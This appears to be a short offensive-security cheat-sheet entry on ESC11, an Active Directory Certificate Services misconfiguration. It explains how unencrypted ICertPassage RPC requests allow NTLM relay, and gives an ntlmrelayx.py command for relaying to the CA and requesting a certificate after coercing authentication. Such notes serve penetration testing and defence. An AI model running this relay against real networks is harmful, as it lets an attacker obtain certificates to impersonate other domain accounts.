# ESC11 - unencrypted ICERT requests 

If the `IF_ENFORCEENCRYPTICERTREQUEST` is disabled on the CA, it allows unencrypted (an unsigned) certificates requests to be made to the RPC endpoint on the certificate server.
It is then possible to relay authentication to the RPC endpoint and request a certificate on behalf of the relayed object.

### Exploitation
-------

1/ setup the relay 

```text-plain
ntlmrelayx.py -t rpc://[CA IP] -rpc-mode ICPR -icpr-ca-name [example-CA] -smb2support [-Template]
```

2/ Coerce an authentication

```text-plain
coercer
etc.
```

### Notes 
-------

- There is issue with the Fortra's version of impacket, you should use the [ThePorgs version](https://github.com/ThePorgs/impacket).

